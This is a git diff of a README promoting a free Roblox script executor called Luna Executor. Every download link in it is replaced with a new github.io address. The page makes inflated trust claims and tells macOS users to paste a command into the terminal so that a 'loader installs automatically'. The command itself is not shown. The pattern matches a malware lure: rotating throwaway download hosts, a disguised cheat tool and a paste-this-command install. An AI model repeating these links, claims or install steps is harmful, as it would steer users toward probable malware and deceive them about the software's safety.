@@ -10,8 +10,8 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 
 <div align="center">
 
-[![Download Luna Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download Luna Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 </div>
 
@@ -113,7 +113,7 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — then paste or load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
 
 ### 🍎 macOS
 
@@ -121,7 +121,7 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 ---
 
@@ -180,5 +180,5 @@ New bypass versions are typically available **within 24 hours** of any Roblox up
 
 Join over 2.1 million players who trust Luna Executor for reliable, transparent Roblox script execution in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
